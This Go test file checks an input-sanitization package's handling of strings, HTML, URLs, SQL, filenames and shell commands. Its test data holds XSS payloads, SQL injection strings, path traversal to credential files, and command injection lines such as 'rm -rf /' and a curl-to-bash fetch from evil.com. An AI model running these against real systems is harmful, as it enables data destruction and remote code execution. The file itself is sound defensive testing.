package sanitize

import (
	"strings"
	"testing"
	"unicode"
)

func TestSanitizeString(t *testing.T) {
	s := New()

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "normal string",
			input:    "Hello World",
			expected: "Hello World",
		},
		{
			name:     "string with whitespace",
			input:    "  Hello World  ",
			expected: "Hello World",
		},
		{
			name:     "string with null byte",
			input:    "Hello\x00World",
			expected: "HelloWorld",
		},
		{
			name:     "empty string",
			input:    "",
			expected: "",
		},
		{
			name:     "only whitespace",
			input:    "   \t\n   ",
			expected: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.SanitizeString(tt.input)
			if result != tt.expected {
				t.Errorf("Expected '%s', got '%s'", tt.expected, result)
			}
		})
	}
}

func TestSanitizeStringStrict(t *testing.T) {
	s := NewStrict()

	input := "Hello\x01\x02World"
	result := s.SanitizeString(input)

	// Strict mode should remove control characters
	if result != "HelloWorld" {
		t.Errorf("Expected 'HelloWorld', got '%s'", result)
	}
}

func TestSanitizeHTML(t *testing.T) {
	s := New()

	tests := []struct {
		name  string
		input string
		check func(string) bool // function to verify result
	}{
		{
			name:  "normal text",
			input: "Hello World",
			check: func(result string) bool {
				return result == "Hello World"
			},
		},
		{
			name:  "script tag",
			input: `<script>alert('XSS')</script>`,
			check: func(result string) bool {
				// Script tags should be removed (result should not contain "script" as word)
				return !strings.Contains(strings.ToLower(result), "<script")
			},
		},
		{
			name:  "HTML entities",
			input: "<div>Hello & World</div>",
			check: func(result string) bool {
				// Should be escaped
				return strings.Contains(result, "&lt;") && strings.Contains(result, "&amp;")
			},
		},
		{
			name:  "event handler",
			input: `<div onclick="alert('XSS')">Click</div>`,
			check: func(result string) bool {
				// Event handlers should be removed
				return !strings.Contains(strings.ToLower(result), "onclick")
			},
		},
		{
			name:  "javascript protocol",
			input: `<a href="javascript:alert('XSS')">Link</a>`,
			check: func(result string) bool {
				// Javascript protocol should be removed
				return !strings.Contains(strings.ToLower(result), "javascript:")
			},
		},
		{
			name:  "mixed XSS",
			input: `<img src=x onerror="alert('XSS')">`,
			check: func(result string) bool {
				// Event handlers should be removed
				return !strings.Contains(strings.ToLower(result), "onerror")
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.SanitizeHTML(tt.input)
			if !tt.check(result) {
				t.Errorf("Sanitization check failed for input '%s', got '%s'", tt.input, result)
			}
		})
	}
}

func TestSanitizeURL(t *testing.T) {
	s := New()

	tests := []struct {
		name  string
		input string
		check func(string) bool
	}{
		{
			name:  "valid HTTP URL",
			input: "http://example.com/path",
			check: func(result string) bool {
				return result == "http://example.com/path"
			},
		},
		{
			name:  "valid HTTPS URL",
			input: "https://example.com/path?query=value",
			check: func(result string) bool {
				return result == "https://example.com/path?query=value"
			},
		},
		{
			name:  "javascript URL",
			input: "javascript:alert('XSS')",
			check: func(result string) bool {
				// Dangerous protocol should be removed or changed
				return !strings.Contains(strings.ToLower(result), "javascript:")
			},
		},
		{
			name:  "URL with fragment",
			input: "https://example.com#section",
			check: func(result string) bool {
				return result == "https://example.com#section"
			},
		},
		{
			name:  "invalid URL",
			input: "not a url",
			check: func(result string) bool {
				// Should sanitize the string at least
				return strings.TrimSpace(result) != ""
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.SanitizeURL(tt.input)
			if !tt.check(result) {
				t.Errorf("Sanitization check failed for input '%s', got '%s'", tt.input, result)
			}
		})
	}
}

func TestSanitizeURLStrict(t *testing.T) {
	s := NewStrict()

	input := "https://user:pass@example.com/path#fragment"
	result := s.SanitizeURL(input)

	// Strict mode should remove user info and fragment
	if strings.Contains(result, "user:pass") || strings.Contains(result, "#fragment") {
		t.Error("Strict mode should remove user info and fragment")
	}
}

func TestSanitizeSQL(t *testing.T) {
	s := New()

	tests := []struct {
		name     string
		input    string
		contains []string // strings that should NOT be in result
	}{
		{
			name:     "normal input",
			input:    "user input",
			contains: []string{},
		},
		{
			name:     "single quote",
			input:    "O'Reilly",
			contains: []string{}, // single quotes get doubled, which is OK
		},
		{
			name:     "SQL comment",
			input:    "admin'--",
			contains: []string{"--"},
		},
		{
			name:     "union select",
			input:    "' UNION SELECT * FROM users--",
			contains: []string{"UNION", "SELECT"},
		},
		{
			name:     "drop table",
			input:    "'; DROP TABLE users;--",
			contains: []string{"DROP", "TABLE", ";"},
		},
		{
			name:     "or statement",
			input:    "' OR '1'='1",
			contains: []string{"OR", "'"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.SanitizeSQL(tt.input)
			for _, forbidden := range tt.contains {
				if strings.Contains(strings.ToUpper(result), forbidden) {
					t.Errorf("Result should not contain '%s', got '%s'", forbidden, result)
				}
			}
		})
	}
}

func TestSanitizeFilename(t *testing.T) {
	s := New()

	tests := []struct {
		name  string
		input string
		check func(string) bool
	}{
		{
			name:  "normal filename",
			input: "document.pdf",
			check: func(result string) bool {
				return result == "document.pdf"
			},
		},
		{
			name:  "path traversal",
			input: "../../../etc/passwd",
			check: func(result string) bool {
				return !strings.Contains(result, "/") && !strings.Contains(result, "..")
			},
		},
		{
			name:  "Windows path",
			input: "C:\\Users\\file.txt",
			check: func(result string) bool {
				return !strings.Contains(result, "\\") && !strings.Contains(result, ":")
			},
		},
		{
			name:  "null byte",
			input: "file\x00.txt",
			check: func(result string) bool {
				return !strings.Contains(result, "\x00")
			},
		},
		{
			name:  "dots and spaces",
			input: "  ...file...  ",
			check: func(result string) bool {
				return result == "file"
			},
		},
		{
			name:  "long filename",
			input: strings.Repeat("a", 300) + ".txt",
			check: func(result string) bool {
				return len(result) <= 255
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.SanitizeFilename(tt.input)
			if !tt.check(result) {
				t.Errorf("Sanitization check failed for input '%s', got '%s'", tt.input, result)
			}
		})
	}
}

func TestSanitizeFilenameStrict(t *testing.T) {
	s := NewStrict()

	input := "file@#$%.txt"
	result := s.SanitizeFilename(input)

	// Strict mode should only keep alphanumeric, underscore, hyphen, and dot
	for _, r := range result {
		if !unicode.IsLetter(r) && !unicode.IsDigit(r) && r != '_' && r != '-' && r != '.' {
			t.Errorf("Unexpected character '%c' in strict filename", r)
		}
	}
}

func TestSanitizeEmail(t *testing.T) {
	s := New()

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "valid email",
			input:    "User@Example.COM",
			expected: "user@example.com",
		},
		{
			name:     "email with whitespace",
			input:    "  user@example.com  ",
			expected: "user@example.com",
		},
		{
			name:     "email with newline",
			input:    "user@example.com\n",
			expected: "user@example.com",
		},
		{
			name:     "invalid email",
			input:    "not an email",
			expected: "not an email",
		},
		{
			name:     "empty string",
			input:    "",
			expected: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.SanitizeEmail(tt.input)
			if result != tt.expected {
				t.Errorf("Expected '%s', got '%s'", tt.expected, result)
			}
		})
	}
}

func TestSanitizeEmailStrict(t *testing.T) {
	s := NewStrict()

	result := s.SanitizeEmail("invalid email")
	if result != "" {
		t.Error("Strict mode should reject invalid emails")
	}
}

func TestSanitizePhoneNumber(t *testing.T) {
	s := New()

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "normal phone",
			input:    "+1 (555) 123-4567",
			expected: "+1 (555) 123-4567",
		},
		{
			name:     "phone with letters",
			input:    "555-ABC-1234",
			expected: "555--1234",
		},
		{
			name:     "phone with special chars",
			input:    "555!@#$%^&*()1234",
			expected: "555()1234",
		},
		{
			name:     "empty string",
			input:    "",
			expected: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.SanitizePhoneNumber(tt.input)
			if result != tt.expected {
				t.Errorf("Expected '%s', got '%s'", tt.expected, result)
			}
		})
	}
}

func TestSanitizeJSON(t *testing.T) {
	s := New()

	tests := []struct {
		name  string
		input string
		check func(string) bool
	}{
		{
			name:  "normal JSON string",
			input: `{"key": "value"}`,
			check: func(result string) bool {
				return result == `{"key": "value"}`
			},
		},
		{
			name:  "JSON with null byte",
			input: `{"key": "val\x00ue"}`,
			check: func(result string) bool {
				// Null bytes should be removed
				return !strings.Contains(result, "\x00")
			},
		},
		{
			name:  "JSON with control chars",
			input: "key\x01value",
			check: func(result string) bool {
				// Control chars should be escaped
				return strings.Contains(result, "\\u0001")
			},
		},
		{
			name:  "empty string",
			input: "",
			check: func(result string) bool {
				return result == ""
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.SanitizeJSON(tt.input)
			if !tt.check(result) {
				t.Errorf("Sanitization check failed for input '%s', got '%s'", tt.input, result)
			}
		})
	}
}

func TestSanitizeCommandLine(t *testing.T) {
	s := New()

	tests := []struct {
		name     string
		input    string
		contains []string // strings that should NOT be in result
	}{
		{
			name:     "normal command",
			input:    "ls -la",
			contains: []string{},
		},
		{
			name:     "command with pipe",
			input:    "ls | grep test",
			contains: []string{"|"},
		},
		{
			name:     "command with semicolon",
			input:    "ls; rm -rf /",
			contains: []string{";"},
		},
		{
			name:     "command with backticks",
			input:    "echo `whoami`",
			contains: []string{"`"},
		},
		{
			name:     "command with $()",
			input:    "echo $(whoami)",
			contains: []string{"$"},
		},
		{
			name:     "command with redirect",
			input:    "cat /etc/passwd > file.txt",
			contains: []string{">"},
		},
		{
			name:     "command with &",
			input:    "ls & rm file",
			contains: []string{"&"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.SanitizeCommandLine(tt.input)
			for _, forbidden := range tt.contains {
				if strings.Contains(result, forbidden) {
					t.Errorf("Result should not contain '%s', got '%s'", forbidden, result)
				}
			}
		})
	}
}

func TestSanitizeInput(t *testing.T) {
	s := New()

	tests := []struct {
		name      string
		input     string
		inputType string
		contains  []string // strings that should NOT be in result
	}{
		{
			name:      "HTML type",
			input:     `<script>alert('XSS')</script>`,
			inputType: "html",
			contains:  []string{"<script"}, // check for actual script tag
		},
		{
			name:      "SQL type",
			input:     "' OR '1'='1",
			inputType: "sql",
			contains:  []string{"OR"}, // OR should be removed in injection context
		},
		{
			name:      "filename type",
			input:     "../../../etc/passwd",
			inputType: "filename",
			contains:  []string{"../", "/"},
		},
		{
			name:      "command type",
			input:     "ls; rm -rf /",
			inputType: "command",
			contains:  []string{";"},
		},
		{
			name:      "unknown type",
			input:     "  Hello World  ",
			inputType: "unknown",
			contains:  []string{},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.SanitizeInput(tt.input, tt.inputType)
			for _, forbidden := range tt.contains {
				if strings.Contains(result, forbidden) {
					t.Errorf("Result should not contain '%s', got '%s'", forbidden, result)
				}
			}
		})
	}
}

func TestValidateString(t *testing.T) {
	s := New()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{
			name:     "valid string",
			input:    "Hello World",
			expected: true,
		},
		{
			name:     "string with null byte",
			input:    "Hello\x00World",
			expected: false,
		},
		{
			name:     "path traversal",
			input:    "../../../etc/passwd",
			expected: false,
		},
		{
			name:     "Windows path traversal",
			input:    "..\\..\\windows\\system32",
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.ValidateString(tt.input)
			if result != tt.expected {
				t.Errorf("Expected %v, got %v", tt.expected, result)
			}
		})
	}
}

func TestValidateHTML(t *testing.T) {
	s := New()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{
			name:     "safe HTML",
			input:    "<div>Hello</div>",
			expected: true,
		},
		{
			name:     "script tag",
			input:    "<script>alert('XSS')</script>",
			expected: false,
		},
		{
			name:     "event handler",
			input:    "<div onclick=\"alert('XSS')\">Click</div>",
			expected: false,
		},
		{
			name:     "javascript protocol",
			input:    "<a href=\"javascript:alert('XSS')\">Link</a>",
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.ValidateHTML(tt.input)
			if result != tt.expected {
				t.Errorf("Expected %v, got %v", tt.expected, result)
			}
		})
	}
}

func TestSanitizeMap(t *testing.T) {
	s := New()

	input := map[string]string{
		"  key1  ": "  value1  ",
		"key\x002": "value\x003",
	}

	result := s.SanitizeMap(input)

	// Check that keys are sanitized
	if _, ok := result["key1"]; !ok {
		t.Error("Key 'key1' should exist in result")
	}

	// Check that values are sanitized
	if result["key1"] != "value1" {
		t.Errorf("Expected 'value1', got '%s'", result["key1"])
	}

	// Check that null bytes are removed
	if strings.Contains(result["key2"], "\x00") {
		t.Error("Null bytes should be removed")
	}
}

func TestSanitizeSlice(t *testing.T) {
	s := New()

	input := []string{
		"  string1  ",
		"string2\x00",
		"  string3  ",
	}

	result := s.SanitizeSlice(input)

	expected := []string{
		"string1",
		"string2",
		"string3",
	}

	if len(result) != len(expected) {
		t.Fatalf("Expected %d items, got %d", len(expected), len(result))
	}

	for i := range expected {
		if result[i] != expected[i] {
			t.Errorf("Item %d: expected '%s', got '%s'", i, expected[i], result[i])
		}
	}
}

func TestDeepSanitize(t *testing.T) {
	s := New()

	tests := []struct {
		name   string
		input  interface{}
		verify func(interface{}) bool
	}{
		{
			name:  "string",
			input: "  hello  ",
			verify: func(result interface{}) bool {
				return result == "hello"
			},
		},
		{
			name: "map",
			input: map[string]interface{}{
				"key1": "  value1  ",
				"key2": "value2\x00",
			},
			verify: func(result interface{}) bool {
				m, ok := result.(map[string]interface{})
				if !ok {
					return false
				}
				return m["key1"] == "value1" && !strings.Contains(m["key2"].(string), "\x00")
			},
		},
		{
			name: "slice",
			input: []interface{}{
				"  item1  ",
				"item2\x00",
			},
			verify: func(result interface{}) bool {
				s, ok := result.([]interface{})
				if !ok {
					return false
				}
				return s[0] == "item1" && !strings.Contains(s[1].(string), "\x00")
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.DeepSanitize(tt.input)
			if !tt.verify(result) {
				t.Error("Sanitization verification failed")
			}
		})
	}
}

func TestRemoveControlChars(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "string with control chars",
			input:    "Hello\x01\x02World",
			expected: "HelloWorld",
		},
		{
			name:     "string with newlines",
			input:    "Hello\nWorld\tTest",
			expected: "Hello\nWorld\tTest",
		},
		{
			name:     "string with carriage return",
			input:    "Hello\r\nWorld",
			expected: "Hello\r\nWorld",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := removeControlChars(tt.input)
			if result != tt.expected {
				t.Errorf("Expected '%s', got '%s'", tt.expected, result)
			}
		})
	}
}

func TestCleanFilename(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "safe filename",
			input:    "document_v1.pdf",
			expected: "document_v1.pdf",
		},
		{
			name:     "filename with special chars",
			input:    "file@#$%.txt",
			expected: "file.txt",
		},
		{
			name:     "filename with spaces",
			input:    "my document.txt",
			expected: "mydocument.txt",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := cleanFilename(tt.input)
			if result != tt.expected {
				t.Errorf("Expected '%s', got '%s'", tt.expected, result)
			}
		})
	}
}

func TestIsValidEmail(t *testing.T) {
	s := New()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{
			name:     "valid email",
			input:    "user@example.com",
			expected: true,
		},
		{
			name:     "valid email with subdomain",
			input:    "user@mail.example.com",
			expected: true,
		},
		{
			name:     "invalid email no domain",
			input:    "user@",
			expected: false,
		},
		{
			name:     "invalid email no user",
			input:    "@example.com",
			expected: false,
		},
		{
			name:     "invalid email no @",
			input:    "userexample.com",
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := s.isValidEmail(tt.input)
			if result != tt.expected {
				t.Errorf("Expected %v, got %v", tt.expected, result)
			}
		})
	}
}

func TestSanitizeXSSAttacks(t *testing.T) {
	s := New()

	xssAttacks := []string{
		`<script>alert('XSS')</script>`,
		`<SCRIPT>alert('XSS')</SCRIPT>`,
		`<img src=x onerror="alert('XSS')">`,
		`<svg onload="alert('XSS')">`,
		`<body onload="alert('XSS')">`,
		`<input onfocus="alert('XSS')" autofocus>`,
		`<select onfocus="alert('XSS')" autofocus>`,
		`<textarea onfocus="alert('XSS')" autofocus>`,
		`<iframe src="javascript:alert('XSS')">`,
		`<details open ontoggle="alert('XSS')">`,
	}

	for _, attack := range xssAttacks {
		t.Run(attack, func(t *testing.T) {
			result := s.SanitizeHTML(attack)
			// After sanitization, should not contain dangerous content
			if strings.Contains(strings.ToLower(result), "alert") {
				t.Errorf("XSS not neutralized: %s -> %s", attack, result)
			}
			if strings.Contains(strings.ToLower(result), "script") {
				t.Errorf("Script tag not removed: %s -> %s", attack, result)
			}
			if strings.Contains(strings.ToLower(result), "onerror") || strings.Contains(strings.ToLower(result), "onload") {
				t.Errorf("Event handler not removed: %s -> %s", attack, result)
			}
		})
	}
}

func TestSanitizeSQLInjectionAttacks(t *testing.T) {
	s := New()

	sqlAttacks := []string{
		`' OR '1'='1`,
		`' OR 1=1--`,
		`' UNION SELECT NULL--`,
		`'; DROP TABLE users;--`,
		`' EXEC xp_cmdshell('dir');--`,
		`admin'--`,
		`' OR 'x'='x`,
		`1' AND 1=1--`,
	}

	for _, attack := range sqlAttacks {
		t.Run(attack, func(t *testing.T) {
			result := s.SanitizeSQL(attack)
			// After sanitization, dangerous keywords should be removed
			resultUpper := strings.ToUpper(result)
			if strings.Contains(resultUpper, "DROP") || strings.Contains(resultUpper, "UNION") {
				t.Errorf("SQL injection not neutralized: %s -> %s", attack, result)
			}
			if strings.Contains(result, "--") {
				t.Errorf("SQL comment not removed: %s -> %s", attack, result)
			}
		})
	}
}

func TestSanitizePathTraversalAttacks(t *testing.T) {
	s := New()

	pathAttacks := []string{
		`../../../etc/passwd`,
		`..\..\..\windows\system32\config\sam`,
		`....//....//....//etc/passwd`,
		`%2e%2e%2fetc/passwd`,
		`/etc/passwd`,
		`C:\Windows\System32\config\sam`,
	}

	for _, attack := range pathAttacks {
		t.Run(attack, func(t *testing.T) {
			result := s.SanitizeFilename(attack)
			// After sanitization, path separators should be removed
			if strings.Contains(result, "/") || strings.Contains(result, "\\") {
				t.Errorf("Path traversal not neutralized: %s -> %s", attack, result)
			}
			if strings.Contains(result, "..") {
				t.Errorf("Double dots not removed: %s -> %s", attack, result)
			}
		})
	}
}

func TestSanitizeCommandInjection(t *testing.T) {
	s := New()

	commandAttacks := []string{
		`ls; rm -rf /`,
		`cat /etc/passwd | grep root`,
		`echo $(whoami)`,
		`whoami && ls`,
		`ls | grep secret`,
		`cat file.txt > output.txt`,
		`export PATH=/tmp`,
		`ls; curl http://evil.com/shell.sh | bash`,
	}

	for _, attack := range commandAttacks {
		t.Run(attack, func(t *testing.T) {
			result := s.SanitizeCommandLine(attack)
			// After sanitization, dangerous operators should be removed
			if strings.Contains(result, ";") || strings.Contains(result, "|") ||
				strings.Contains(result, "$(") || strings.Contains(result, "&") ||
				strings.Contains(result, ">") {
				t.Errorf("Command injection not neutralized: %s -> %s", attack, result)
			}
		})
	}
}

// Benchmark tests
func BenchmarkSanitizeString(b *testing.B) {
	s := New()
	input := "  Test String with spaces  "

	for i := 0; i < b.N; i++ {
		s.SanitizeString(input)
	}
}

func BenchmarkSanitizeHTML(b *testing.B) {
	s := New()
	input := `<div>Hello <b>World</b></div>`

	for i := 0; i < b.N; i++ {
		s.SanitizeHTML(input)
	}
}

func BenchmarkSanitizeSQL(b *testing.B) {
	s := New()
	input := "O'Reilly"

	for i := 0; i < b.N; i++ {
		s.SanitizeSQL(input)
	}
}
